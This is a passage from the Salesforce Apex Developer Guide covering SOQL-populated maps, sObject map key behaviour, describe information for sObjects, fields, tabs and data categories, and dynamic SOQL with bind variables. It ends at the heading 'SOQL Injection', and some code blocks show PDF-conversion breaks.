When working with SOQL queries, maps can be populated from the results returned by the SOQL query. The map key must be declared
with an ID or String data type, and the map value must be declared as an sObject data type.

This example shows how to populate a new map from a query. In the example, the SOQL query returns a list of accounts with their `Id`
and `Name` fields. The `new` operator uses the returned list of accounts to create a map.

```
   // Populate map from SOQL query

   Map<ID, Account> m = new Map<ID, Account>([SELECT Id, Name FROM Account LIMIT 10]);

   // After populating the map, iterate through the map entries

   for (ID idKey : m.keyset()) {

      Account a = m.get(idKey);

      System.debug(a);

   }

```

One common usage of this map type is for in-memory “joins” between two tables.


Apex Developer Guide Working with Data in Apex

Note: RecentlyViewed records for users who are members of several communities can’t be retrieved automatically into a map
via Apex. This is because records of a user with different networks can result in duplicate IDs that maps don’t support. For more
[information, see RecentlyViewed.](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_recentlyviewed.htm)

Using Map Methods

The `Map` class exposes various methods that you can use to work with map elements, such as adding, removing, or retrieving elements.
This example uses Map methods to add new elements and retrieve existing elements from the map. This example also checks for the
existence of a key and gets the set of all keys. The map in this example has one element with an integer key and an account value.

```
   Account myAcct = new Account(); //Define a new account

   Map<Integer, Account> m = new Map<Integer, Account>(); // Define a new map

   m.put(1, myAcct); // Insert a new key-value pair in the map

   System.assert(!m.containsKey(3)); // Assert that the map contains a key

   Account a = m.get(1); // Retrieve a value, given a particular key

   Set<Integer> s = m.keySet(); // Return a set that contains all of the keys in the

   map

###### sObject Map Considerations sObject Map Considerations

```

Be cautious when using sObjects as map keys. Key matching for sObjects is based on the comparison of all sObject field values. If one
or more field values change after adding an sObject to the map, attempting to retrieve this sObject from the map returns `null` . This
is because the modified sObject isn’t found in the map due to different field values. This can occur if you explicitly change a field on the
sObject, or if the sObject fields are implicitly changed by the system; for example, after inserting an sObject, the sObject variable has the
ID field autofilled. Attempting to fetch this Object from a map to which it was added before the `insert` operation won’t yield the
map entry, as shown in this example.

```
   // Create an account and add it to the map

   Account a1 = new Account(Name='A1');

   Map<sObject, Integer> m = new Map<sObject, Integer>{

   a1 => 1};

   // Get a1's value from the map.

   // Returns the value of 1.

   System.assertEquals(1, m.get(a1));

   // Id field is null.

   System.assertEquals(null, a1.Id);

   // Insert a1.

   // This causes the ID field on a1 to be auto-filled

   insert a1;

   // Id field is now populated.

   System.assertNotEquals(null, a1.Id);

   // Get a1's value from the map again.

   // Returns null because Map.get(sObject) doesn't find

   // the entry based on the sObject with an auto-filled ID.

   // This is because when a1 was originally added to the map

   // before the insert operation, the ID of a1 was null.

   System.assertEquals(null, m.get(a1));

```


Apex Developer Guide Working with Data in Apex

Another scenario where sObject fields are autofilled is in triggers, for example, when using before and after insert triggers for an sObject.
If those triggers share a static map defined in a class, and the sObjects in `Trigger.New` are added to this map in the before trigger,
the sObjects in `Trigger.New` in the after trigger aren’t found in the map because the two sets of sObjects differ by the fields that
are autofilled. The sObjects in `Trigger.New` in the after trigger have system fields populated after insertion, namely: ID, CreatedDate,
CreatedById, LastModifiedDate, LastModifiedById, and SystemModStamp.

#### Dynamic Apex Dynamic Apex enables developers to create more flexible applications by providing them with the ability to:

**•** Access sObject and field describe information

_Describe information_ provides metadata information about sObject and field properties. For example, the describe information for
an sObject includes whether that type of sObject supports operations like create or undelete, the sObject's name and label, the
sObject's fields and child objects, and so on. The describe information for a field includes whether the field has a default value,
whether it is a calculated field, the type of the field, and so on.

Note that describe information provides information about _objects_ in an organization, not individual records.

**•** Access Salesforce app information

You can obtain describe information for standard and custom apps available in the Salesforce user interface. Each app corresponds
to a collection of tabs. Describe information for an app includes the app’s label, namespace, and tabs. Describe information for a tab
includes the sObject associated with the tab, tab icons and colors.

**•** Write dynamic SOQL queries, dynamic SOSL queries and dynamic DML

_Dynamic SOQL and SOSL queries_ provide the ability to execute SOQL or SOSL as a string at runtime, while _dynamic DML_ provides the
ability to create a record dynamically and then insert it into the database using DML. Using dynamic SOQL, SOSL, and DML, an
application can be tailored precisely to the organization as well as the user's permissions. This can be useful for applications that are
installed from AppExchange.

##### 1. Understanding Apex Describe Information

2. Using Field Tokens

3. Understanding Describe Information Permissions

4. Describing sObjects Using Schema Method

5. Describing Tabs Using Schema Methods

6. Accessing All sObjects

7. Accessing All Data Categories Associated with an sObject

8. Dynamic SOQL

9. Dynamic SOSL

10. Dynamic DML

##### Understanding Apex Describe Information

You can describe sObjects either by using tokens or the `describeSObjects` Schema method.

Apex provides two data structures and a method for sObject and field describe information:

**•** _Token_ —a lightweight, serializable reference to an sObject or a field that is validated at compile time. This is used for token describes.


Apex Developer Guide Working with Data in Apex

**•** The `describeSObjects` method—a method in the `Schema` class that performs describes on one or more sObject types.

**•** _Describe result_ —an object of type `Schema.DescribeSObjectResult` that contains all the describe properties for the
sObject or field. Describe result objects are not serializable, and are validated at runtime. This result object is returned when performing
the describe, using either the sObject token or the `describeSObjects` method.

Describing sObjects Using Tokens

It is easy to move from a token to its describe result, and vice versa. Both sObject and field tokens have the method `getDescribe`
which returns the describe result for that token. On the describe result, the `getSObjectType` and `getSObjectField` methods
return the tokens for sObject and field, respectively.

Because tokens are lightweight, using them can make your code faster and more efficient. For example, use the token version of an
sObject or field when you are determining the type of an sObject or field that your code needs to use. The token can be compared using
the equality operator ( `==` ) to determine whether an sObject is the Account object, for example, or whether a field is the `Name` field or
a custom calculated field.

The following code provides a general example of how to use tokens and describe results to access information about sObject and field
properties:

```
   // Create a new account as the generic type sObject

   sObject s = new Account();

   // Verify that the generic sObject is an Account sObject

   System.assert(s.getsObjectType() == Account.sObjectType);

   // Get the sObject describe result for the Account object

   Schema.DescribeSObjectResult dsr = Account.sObjectType.getDescribe();

   // Get the field describe result for the Name field on the Account object

   Schema.DescribeFieldResult dfr = Schema.sObjectType.Account.fields.Name;

   // Verify that the field token is the token for the Name field on an Account object

   System.assert(dfr.getSObjectField() == Account.Name);

   // Get the field describe result from the token

   dfr = dfr.getSObjectField().getDescribe();

```

The following algorithm shows how you can work with describe information in Apex:

**1.** Generate a list or map of tokens for the sObjects in your organization (see Accessing All sObjects.)

**2.** Determine the sObject you need to access.

**3.** Generate the describe result for the sObject.

**4.** If necessary, generate a map of field tokens for the sObject (see Accessing All Field Describe Results for an sObject.)

**5.** Generate the describe result for the field the code needs to access.

Using sObject Tokens

SObjects, such as Account and MyCustomObject__c, act as static classes with special static methods and member variables for accessing
token and describe result information. You must explicitly reference an sObject and field name at compile time to gain access to the
describe result.

To access the token for an sObject, use one of the following methods:

**•** Access the `sObjectType` member variable on an sObject type, such as Account.


Apex Developer Guide Working with Data in Apex

**•** Call the `getSObjectType` method on an sObject describe result, an sObject variable, a list, or a map.

`Schema.SObjectType` is the data type for an sObject token.

In the following example, the token for the Account sObject is returned:

```
   Schema.sObjectType t = Account.sObjectType;

```

The following also returns a token for the Account sObject:

```
   Account a = new Account();

   Schema.sObjectType t = a.getSObjectType();

```

This example can be used to determine whether an sObject or a list of sObjects is of a particular type:

```
   // Create a generic sObject variable s

   SObject s = Database.query('SELECT Id FROM Account LIMIT 1');

   // Verify if that sObject variable is an Account token

   System.assertEquals(s.getSObjectType(), Account.sObjectType);

   // Create a list of generic sObjects

   List<sObject> sobjList = new Account[]{};

   // Verify if the list of sObjects contains Account tokens

   System.assertEquals(sobjList.getSObjectType(), Account.sObjectType);

```

Some standard sObjects have a field called `sObjectType`, for example, AssignmentRule, QueueSObject, and RecordType. For these
types of sObjects, always use the `getSObjectType` method for retrieving the token. If you use the property, for example,
`RecordType.sObjectType`, the field is returned.

Obtaining sObject Describe Results Using Tokens

To access the describe result for an sObject, use one of the following methods:

**•** Call the `getDescribe` method on an sObject token.

**•** Use the Schema `sObjectType` static variable with the name of the sObject. For example, `Schema.sObjectType.Lead` .

`Schema.DescribeSObjectResult` is the data type for an sObject describe result.

The following example uses the `getDescribe` method on an sObject token:

```
   Schema.DescribeSObjectResult dsr = Account.sObjectType.getDescribe();

```

The following example uses the Schema `sObjectType` static member variable:

```
   Schema.DescribeSObjectResult dsr = Schema.SObjectType.Account;

```

[For more information about the methods available with the sObject describe result, see DescribeSObjectResultClass.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)

SEE ALSO:

[DescribeSObjectResult.fields()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)

[DescribeSObjectResult.fieldsets()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)

##### Using Field Tokens

To access the token for a field, use one of the following methods:


Apex Developer Guide Working with Data in Apex

**•** Access the static member variable name of an sObject static type, for example, `Account.Name` .

**•** Call the `getSObjectField` method on a field describe result.

The field token uses the data type `Schema.SObjectField` .

In the following example, the field token is returned for the Account object's `Description` field:

```
   Schema.SObjectField fieldToken = Account.Description;

```

In the following example, the field token is returned from the field describe result:

```
   // Get the describe result for the Name field on the Account object

   Schema.DescribeFieldResult dfr = Schema.sObjectType.Account.fields.Name;

   // Verify that the field token is the token for the Name field on an Account object

   System.assert(dfr.getSObjectField() == Account.Name);

   // Get the describe result from the token

   dfr = dfr.getSObjectField().getDescribe();

```

Note: Field tokens aren't available for person accounts. If you access `Schema.Account.` _**`fieldname`**_, you get an exception
error. Instead, specify the field name as a string.

Using Field Describe Results

To access the describe result for a field, use one of the following methods:

**•** Call the `getDescribe` method on a field token.

**•** Access the `fields` member variable of an sObject token with a field member variable (such as `Name`, `BillingCity`, and so
on.)

The field describe result uses the data type `Schema.DescribeFieldResult` .

The following example uses the `getDescribe` method:

```
   Schema.DescribeFieldResult dfr = Account.Description.getDescribe();

```

This example uses the `fields` member variable method:

```
   Schema.DescribeFieldResult dfr = Schema.SObjectType.Account.fields.Name;

```

In the example above, the system uses special parsing to validate that the final member variable ( `Name` ) is valid for the specified sObject
at compile time. When the parser finds the `fields` member variable, it looks backwards to find the name of the sObject ( `Account` ).
It validates that the field name following the `fields` member variable is legitimate. The `fields` member variable only works when
used in this manner.

Note: Don’t use the `fields` member variable without also using either a field member variable name or the `getMap` method.
For more information on `getMap`, see the next section.

[For more information about the methods available with a field describe result, see DescribeFieldResultClass.](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_fields_describe.htm)

Accessing All Field Describe Results for an sObject

Use the field describe result's `getMap` method to return a map that represents the relationship between all the field names (keys) and
the field tokens (values) for an sObject.


Apex Developer Guide Working with Data in Apex

The following example generates a map that can be used to access a field by name:

```
   Map<String, Schema.SObjectField> fieldMap = Schema.SObjectType.Account.fields.getMap();

```

Note: The value type of this map is not a field describe result. Using the describe results would take too many system resources.
Instead, it is a map of tokens that you can use to find the appropriate field. After you determine the field, generate the describe
result for it.

The map has the following characteristics:

**•** It is dynamic, that is, it is generated at runtime on the fields for that sObject.

**•** All field names are case insensitive.

**•** The keys use namespaces as required.

**•** The keys reflect whether the field is a custom object.

Field Describe Considerations

Note the following when describing fields.

**•** A field describe that’s executed from within an installed managed package returns Chatter fields even if Chatter is not enabled in
the installing organization. This is not true if the field describe is executed from a class that’s not within an installed managed package.

**•** When you describe sObjects and their fields from within an Apex class, custom fields of new field types are returned regardless of
the API version that the class is saved in. If a field type, such as the geolocation field type, is available only in a recent API version,
components of a geolocation field are returned even if the class is saved in an earlier API version.

Versioned Behavior Changes

In API version 34.0 and later, Schema.DescribeSObjectResult on a custom SObjectType includes map keys prefixed with the namespace,
even if the namespace is that of currently executing code. If you work with multiple namespaces and generate runtime describe data,
make sure that your code accesses keys correctly using the namespace prefix.

SEE ALSO:

[DescribeSObjectResult.fields()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)

[DescribeSObjectResult.fieldsets()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)

##### Understanding Describe Information Permissions

Apex classes run in user mode by default, which means that user permissions on objects and field-level security are respected. A user
cannot run code that tries to access fields or objects that are hidden from the user.

User permissions also matter when you execute describe calls in an anonymous block.. As a result, not all sObjects and fields can be
looked up if access is restricted for the running user. For example, if you describe account fields in an anonymous block and you don’t
have access to all fields, not all fields are returned.

SEE ALSO:

Anonymous Blocks

Managed Package Types


Apex Developer Guide Working with Data in Apex

##### Describing sObjects Using Schema Method

As an alternative to using tokens, you can describe sObjects by calling the `describeSObjects` Schema method and passing one
or more sObject type names for the sObjects you want to describe.

This example gets describe metadata information for two sObject types—The Account standard object and the Merchandise__c custom
object. After obtaining the describe result for each sObject, this example writes the returned information to the debug output, such as
the sObject label, number of fields, whether it is a custom object or not, and the number of child relationships.

```
   // sObject types to describe

   String[] types = new String[]{'Account','Merchandise__c'};

   // Make the describe call

   Schema.DescribeSobjectResult[] results = Schema.describeSObjects(types);

   System.debug('Got describe information for ' + results.size() + ' sObjects.');

   // For each returned result, get some info

   for(Schema.DescribeSobjectResult res : results) {

      System.debug('sObject Label: ' + res.getLabel());

      System.debug('Number of fields: ' + res.fields.getMap().size());

     System.debug(res.isCustom() ? 'This is a custom object.' : 'This is a standard object.');

      // Get child relationships

      Schema.ChildRelationship[] rels = res.getChildRelationships();

      if (rels.size() > 0) {

        System.debug(res.getName() + ' has ' + rels.size() + ' child relationships.');

      }

   }

```

SEE ALSO:

[DescribeSObjectResult.fields()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)

[DescribeSObjectResult.fieldsets()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_sobject_describe.htm)

##### Describing Tabs Using Schema Methods

You can get metadata information about the apps and their tabs available in the Salesforce user interface by executing a describe call
in Apex. Also, you can get more detailed information about each tab. Use the `describeTabs` Schema method and the `getTabs`
method in `Schema.DescribeTabResult`, respectively.

This example shows how to get the tab sets for each app. The example then obtains tab describe metadata information for the Sales
app. For each tab, metadata information includes the icon URL, whether the tab is custom or not, and colors among others. The tab
describe information is written to the debug output.

```
   // Get tab set describes for each app

   List<Schema.DescribeTabSetResult> tabSetDesc = Schema.describeTabs();

   // Iterate through each tab set describe for each app and display the info

   for(DescribeTabSetResult tsr : tabSetDesc) {

      String appLabel = tsr.getLabel();

      System.debug('Label: ' + appLabel);

      System.debug('Logo URL: ' + tsr.getLogoUrl());

      System.debug('isSelected: ' + tsr.isSelected());

      String ns = tsr.getNamespace();

```


Apex Developer Guide Working with Data in Apex

```
      if (ns == '') {

        System.debug('The ' + appLabel + ' app has no namespace defined.');

      }

      else {

        System.debug('Namespace: ' + ns);

      }

      // Display tab info for the Sales app

      if (appLabel == 'Sales') {

        List<Schema.DescribeTabResult> tabDesc = tsr.getTabs();

        System.debug('-- Tab information for the Sales app --');

        for(Schema.DescribeTabResult tr : tabDesc) {

           System.debug('getLabel: ' + tr.getLabel());

           System.debug('getColors: ' + tr.getColors());

           System.debug('getIconUrl: ' + tr.getIconUrl());

           System.debug('getIcons: ' + tr.getIcons());

           System.debug('getMiniIconUrl: ' + tr.getMiniIconUrl());

           System.debug('getSobjectName: ' + tr.getSobjectName());

           System.debug('getUrl: ' + tr.getUrl());

           System.debug('isCustom: ' + tr.isCustom());

        }

      }

   }

   // Example debug statement output

   // DEBUG|Label: Sales

   // DEBUG|Logo URL:

   https:// MyDomainName .my.salesforce.com/img/seasonLogos/2014_winter_aloha.png

   // DEBUG|isSelected: true

   // DEBUG|The Sales app has no namespace defined.// DEBUG|-- Tab information for the Sales

    app -
   // (This is an example debug output for the Accounts tab.)

   // DEBUG|getLabel: Accounts

   // DEBUG|getColors:

   (Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme4;],

   // Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme3;],

   // Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme2;])

   // DEBUG|getIconUrl: https:// MyDomainName .my.salesforce.com/img/icon/accounts32.png

   // DEBUG|getIcons:

   (Schema.DescribeIconResult[getContentType=image/png;getHeight=32;getTheme=theme3;

   //

   getUrl=https:// MyDomainName .my.salesforce.com/img/icon/accounts32.png;getWidth=32;],

   // Schema.DescribeIconResult[getContentType=image/png;getHeight=16;getTheme=theme3;

   //

   getUrl=https:// MyDomainName .my.salesforce.com/img/icon/accounts16.png;getWidth=16;])

   // DEBUG|getMiniIconUrl: https:// MyDomainName .my.salesforce.com/img/icon/accounts16.png

   // DEBUG|getSobjectName: Account

   // DEBUG|getUrl: https:// MyDomainName .my.salesforce.com/001/o

   // DEBUG|isCustom: false

```


Apex Developer Guide Working with Data in Apex

##### Accessing All sObjects

Use the Schema `getGlobalDescribe` method to return a map that represents the relationship between all sObject names (keys)
to sObject tokens (values). For example:

```
   Map<String, Schema.SObjectType> gd = Schema.getGlobalDescribe();

```

The map has the following characteristics:

**•** It is dynamic, that is, it is generated at runtime on the sObjects currently available for the organization, based on permissions.

**•** The sObject names are case insensitive.

**•** The keys are prefixed with the namespace, if any. [*]

**•** The keys reflect whether the sObject is a custom object.

     Starting with Apex saved using Salesforce API version 28.0, the keys in the map that `getGlobalDescribe` returns are always
prefixed with the namespace, if any, of the code in which it is running. For example, if the code block that makes the
`getGlobalDescribe` call is in namespace NS1, and a custom object named MyObject__c is in the same namespace, the key
returned is `NS1__MyObject__c` . For Apex saved using earlier API versions, the key contains the namespace only if the namespace
of the code block and the namespace of the sObject are different. For example, if the code block that generates the map is in namespace
N1, and an sObject is also in N1, the key in the map is represented as `MyObject__c` . However, if the code block is in namespace N1,
and the sObject is in namespace N2, the key is `N2__MyObject__c` .

Standard sObjects have no namespace prefix.

Note: If the `getGlobalDescribe` method is called from an installed managed package, it returns sObject names and tokens
for Chatter sObjects, such as NewsFeed and UserProfileFeed, even if Chatter is not enabled in the installing organization. This is
not true if the `getGlobalDescribe` method is called from a class not within an installed managed package.

##### Accessing All Data Categories Associated with an sObject

Use the `describeDataCategoryGroups` and `describeDataCategoryGroupStructures` methods to return the
categories associated with a specific object:

**1.** Return all the category groups associated with the objects of your choice (see
`describeDataCategoryGroups(sObjectNames)` ).

**2.** From the returned map, get the category group name and sObject name you want to further interrogate (see

[DescribeDataCategoryGroupResult Class).](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_Schema_DescribeDataCategoryGroupResult.htm)

**3.** Specify the category group and associated object, then retrieve the categories available to this object (see
`describeDataCategoryGroupStructures` ).

The `describeDataCategoryGroupStructures` method returns the categories available for the object in the category group
you specified. For additional information about data categories, see “Work with Data Categories” in the Salesforce online help.

In the following example, the `describeDataCategoryGroupSample` method returns all the category groups associated with
the Article and Question objects. The `describeDataCategoryGroupStructures` method returns all the categories available
for articles and questions in the Regions category group. For additional information about articles and questions, see “Work with Articles
and Translations” in the Salesforce online help.

To use the following example, you must:

**•** Enable Salesforce Knowledge.

**•** Enable the answers feature.

**•** Create a data category group called Regions.

**•** Assign Regions as the data category group to be used by Answers.


Apex Developer Guide Working with Data in Apex

**•** Make sure the Regions data category group is assigned to Salesforce Knowledge.

For more information on creating data category groups, see “Create and Modify Category Groups” in the Salesforce online help. For more
information on answers, see “Answers Overview” in the Salesforce online help.

```
   public class DescribeDataCategoryGroupSample {

     public static List<DescribeDataCategoryGroupResult> describeDataCategoryGroupSample(){

       List<DescribeDataCategoryGroupResult> describeCategoryResult;

       try {

         //Creating the list of sobjects to use for the describe

         //call

         List<String> objType = new List<String>();

         objType.add('KnowledgeArticleVersion');

         objType.add('Question');

         //Describe Call

         describeCategoryResult = Schema.describeDataCategoryGroups(objType);

         //Using the results and retrieving the information

         for(DescribeDataCategoryGroupResult singleResult : describeCategoryResult){

           //Getting the name of the category

           singleResult.getName();

           //Getting the name of label

           singleResult.getLabel();

           //Getting description

           singleResult.getDescription();

           //Getting the sobject

           singleResult.getSobject();

         }

       } catch(Exception e){

       }

       return describeCategoryResult;

     }

   }

   public class DescribeDataCategoryGroupStructures {

     public static List<DescribeDataCategoryGroupStructureResult>

     getDescribeDataCategoryGroupStructureResults(){

       List<DescribeDataCategoryGroupResult> describeCategoryResult;

       List<DescribeDataCategoryGroupStructureResult> describeCategoryStructureResult;

       try {

         //Making the call to the describeDataCategoryGroups to

         //get the list of category groups associated

         List<String> objType = new List<String>();

         objType.add('KnowledgeArticleVersion');

         objType.add('Question');

```


Apex Developer Guide Working with Data in Apex

```
         describeCategoryResult = Schema.describeDataCategoryGroups(objType);

         //Creating a list of pair objects to use as a parameter

         //for the describe call

         List<DataCategoryGroupSobjectTypePair> pairs =

           new List<DataCategoryGroupSobjectTypePair>();

         //Looping throught the first describe result to create

         //the list of pairs for the second describe call

         for(DescribeDataCategoryGroupResult singleResult :

         describeCategoryResult){

           DataCategoryGroupSobjectTypePair p =

            new DataCategoryGroupSobjectTypePair();

           p.setSobject(singleResult.getSobject());

           p.setDataCategoryGroupName(singleResult.getName());

           pairs.add(p);

         }

         //describeDataCategoryGroupStructures()

         describeCategoryStructureResult =

           Schema.describeDataCategoryGroupStructures(pairs, false);

         //Getting data from the result

         for(DescribeDataCategoryGroupStructureResult singleResult :

   describeCategoryStructureResult){

           //Get name of the associated Sobject

           singleResult.getSobject();

           //Get the name of the data category group

           singleResult.getName();

           //Get the name of the data category group

           singleResult.getLabel();

           //Get the description of the data category group

           singleResult.getDescription();

           //Get the top level categories

           DataCategory [] toplevelCategories =

            singleResult.getTopCategories();

           //Recursively get all the categories

           List<DataCategory> allCategories =

            getAllCategories(toplevelCategories);

           for(DataCategory category : allCategories) {

            //Get the name of the category

            category.getName();

            //Get the label of the category

            category.getLabel();

            //Get the list of sub categories in the category

            DataCategory [] childCategories =

```


Apex Developer Guide Working with Data in Apex

```
              category.getChildCategories();

           }

         }

       } catch (Exception e){

       }

       return describeCategoryStructureResult;

      }

     private static DataCategory[] getAllCategories(DataCategory [] categories){

       if(categories.isEmpty()){

         return new DataCategory[]{};

       } else {

         DataCategory [] categoriesClone = categories.clone();

         DataCategory category = categoriesClone[0];

         DataCategory[] allCategories = new DataCategory[]{category};

         categoriesClone.remove(0);

         categoriesClone.addAll(category.getChildCategories());

         allCategories.addAll(getAllCategories(categoriesClone));

         return allCategories;

       }

     }

   }

```

Testing Access to All Data Categories Associated with an sObject

The following example tests the `describeDataCategoryGroupSample` method shown earlier. It ensures that the returned
category group and associated objects are correct.

```
   @isTest

   private class DescribeDataCategoryGroupSampleTest {

     public static testMethod void describeDataCategoryGroupSampleTest(){

       List<DescribeDataCategoryGroupResult>describeResult =

              DescribeDataCategoryGroupSample.describeDataCategoryGroupSample();

       //Assuming that you have KnowledgeArticleVersion and Questions

       //associated with only one category group 'Regions'.

       System.assert(describeResult.size() == 2,

          'The results should only contain two results: ' + describeResult.size());

       for(DescribeDataCategoryGroupResult result : describeResult) {

         //Storing the results

         String name = result.getName();

         String label = result.getLabel();

         String description = result.getDescription();

         String objectNames = result.getSobject();

         //asserting the values to make sure

         System.assert(name == 'Regions',

         'Incorrect name was returned: ' + name);

         System.assert(label == 'Regions of the World',

         'Incorrect label was returned: ' + label);

         System.assert(description == 'This is the category group for all the regions',

         'Incorrect description was returned: ' + description);

```


Apex Developer Guide Working with Data in Apex

```
         System.assert(objectNames.contains('KnowledgeArticleVersion')

                 || objectNames.contains('Question'),

                 'Incorrect sObject was returned: ' + objectNames);

       }

     }

   }

```

This example tests the `describeDataCategoryGroupStructures` method. It ensures that the returned category group,
categories and associated objects are correct.

```
   @isTest

   private class DescribeDataCategoryGroupStructuresTest {

     public static testMethod void getDescribeDataCategoryGroupStructureResultsTest(){

       List<Schema.DescribeDataCategoryGroupStructureResult> describeResult =

        DescribeDataCategoryGroupStructures.getDescribeDataCategoryGroupStructureResults();

       System.assert(describeResult.size() == 2,

           'The results should only contain 2 results: ' + describeResult.size());

       //Creating category info

       CategoryInfo world = new CategoryInfo('World', 'World');

       CategoryInfo asia = new CategoryInfo('Asia', 'Asia');

       CategoryInfo northAmerica = new CategoryInfo('NorthAmerica',

                                 'North America');

       CategoryInfo southAmerica = new CategoryInfo('SouthAmerica',

                                 'South America');

       CategoryInfo europe = new CategoryInfo('Europe', 'Europe');

       List<CategoryInfo> info = new CategoryInfo[] {

        asia, northAmerica, southAmerica, europe

      };

       for (Schema.DescribeDataCategoryGroupStructureResult result : describeResult) {

         String name = result.getName();

         String label = result.getLabel();

         String description = result.getDescription();

         String objectNames = result.getSobject();

         //asserting the values to make sure

         System.assert(name == 'Regions',

         'Incorrect name was returned: ' + name);

         System.assert(label == 'Regions of the World',

         'Incorrect label was returned: ' + label);

         System.assert(description == 'This is the category group for all the regions',

         'Incorrect description was returned: ' + description);

         System.assert(objectNames.contains('KnowledgeArticleVersion')

               || objectNames.contains('Question'),

                 'Incorrect sObject was returned: ' + objectNames);

         DataCategory [] topLevelCategories = result.getTopCategories();

         System.assert(topLevelCategories.size() == 1,

        'Incorrect number of top level categories returned: ' + topLevelCategories.size());

         System.assert(topLevelCategories[0].getLabel() == world.getLabel() &&

```


Apex Developer Guide Working with Data in Apex

```
                 topLevelCategories[0].getName() == world.getName());

         //checking if the correct children are returned

         DataCategory [] children = topLevelCategories[0].getChildCategories();

         System.assert(children.size() == 4,

         'Incorrect number of children returned: ' + children.size());

         for(Integer i=0; i < children.size(); i++){

           System.assert(children[i].getLabel() == info[i].getLabel() &&

                   children[i].getName() == info[i].getName());

         }

       }

     }

     private class CategoryInfo {

       private final String name;

       private final String label;

       private CategoryInfo(String n, String l){

         this.name = n;

         this.label = l;

       }

       public String getName(){

         return this.name;

       }

       public String getLabel(){

         return this.label;

       }

     }

   }

##### Dynamic SOQL Dynamic SOQL refers to the creation of a SOQL string at run time with Apex code. Dynamic SOQL enables you to create more flexible
```

applications. For example, you can create a search based on input from an end user or update records with varying field names.

To create a dynamic SOQL query at run time, use the `Database.query` or `Database.queryWithBinds` methods, in one
of the following ways.

**•** Return a single sObject when the query returns a single record:

```
     sObject s = Database.query( string );

```

**•** Return a list of sObjects when the query returns more than a single record:

```
     List<sObject> sobjList = Database.query( string );

```

**•** Return a list of sObjects using a map of bind variables:

```
     List<sObject> sobjList = Database.queryWithBinds( string, bindVariablesMap, accessLevel);

```


Apex Developer Guide Working with Data in Apex

The `Database.query` and `Database.queryWithBinds` methods can be used wherever an inline SOQL query can be used,
such as in regular assignment statements and `for` loops. The results are processed in much the same way as static SOQL queries are
processed.

In API version 55.0 and later, you can use the _`accessLevel`_ parameter to run the query operation in user or system mode. The
_`accessLevel`_ parameter specifies whether the method runs in system mode ( `AccessLevel.SYSTEM_MODE` ) or user mode
( `AccessLevel.USER_MODE` ). In system mode, the object and field-level permissions of the current user are ignored, and the record
[sharing rules are controlled by the class sharing keywords. In user mode, the object permissions, field-level security, and sharing rules](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexcode.meta/apexcode/apex_classes_keywords_sharing.htm)
of the current user are enforced. User mode is the default.

Dynamic SOQL results can be specified as concrete sObjects, such as Account or MyCustomObject__c, or as the generic sObject data
type. At run time, the system validates that the type of the query matches the declared type of the variable. If the query doesn’t return
the correct sObject type, a run-time error is thrown. Therefore, you don’t have to cast from a generic sObject to a concrete sObject.

Dynamic SOQL queries have the same governor limits as static queries. For more information on governor limits, see Execution Governors
and Limits on page 349.

[For a full description of SOQL query syntax, see Salesforce Object Query Language (SOQL) in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.soql_sosl.meta/soql_sosl/sforce_api_calls_soql.htm) _SOQL and SOSL Reference._

Dynamic SOQL Considerations

You can use simple bind variables in dynamic SOQL query strings when using `Database.query` . Bind variables in the query must
be within the scope of the database operation. The following is allowed:

```
   String myTestString = 'TestName';

   List<sObject> sobjList = Database.query('SELECT Id FROM MyCustomObject__c WHERE Name =

   :myTestString');

```

However, unlike inline SOQL, you can’t use bind variable fields in the query string with `Database.query` . The following example
isn’t supported and results in a `Variable does not exist` error.

```
   MyCustomObject__c myVariable = new MyCustomObject__c(field1__c ='TestField');

   List<sObject> sobjList = Database.query('SELECT Id FROM MyCustomObject__c WHERE field1__c

    = :myVariable.field1__c');

```

You can instead resolve the variable field into a string and use the string in your dynamic SOQL query:

```
   String resolvedField1 = myVariable.field1__c;

   List<sObject> sobjList = Database.query('SELECT Id FROM MyCustomObject__c WHERE field1__c

    = :resolvedField1');

```

(API version 57.0 and later) Another option is to use the `Database.queryWithBinds` method. With this method, bind variables
in the query are resolved from a Map parameter directly with a key, rather than from Apex code variables. This removes the need for the
variables to be in scope when the query is executed. This example shows a SOQL query that uses a bind variable for an Account name;
its value is passed in with the _`acctBinds`_ Map.

```
   Map<String, Object> acctBinds = new Map<String, Object>{'acctName' => 'Acme Corporation'};

   List<Account> accts =

      Database.queryWithBinds('SELECT Id FROM Account WHERE Name = :acctName',

                    acctBinds,

                    AccessLevel.USER_MODE);

```

These considerations apply when using the Map parameter in the `Database.queryWithBinds` method:

**•** Although map keys of type String are case-sensitive,the `queryWithBinds` method doesn’t support Map keys that differ only
in case. In a `queryWithBinds` method, comparison of Map keys is case-insensitive. If duplicate Map keys exist, the method


Apex Developer Guide Working with Data in Apex

throws a runtime `QueryException` . This example throws this runtime exception: `System.QueryException: The`
`bindMap consists of duplicate case-insensitive keys: [Acctname, acctName]` .

```
     Map<String, Object> bindVars = new Map<String, Object>{'acctName' => 'Acme Corporation'};

     bindVars.put('Acctname', 'Foo');

     string query = 'Select Id from Contact where Name like :acctName';

     List<Contact> contacts = Database.queryWithBinds(query, bindVars, AccessLevel.USER_MODE);

```

**•** Map keys must follow naming standards: they must start with an ASCII letter, can’t start with a number, must not use reserved
keywords, and must adhere to variable naming requirements.

**•** Although currently supported, Salesforce recommends against using the dot notation with Map keys.

SOQL Injection

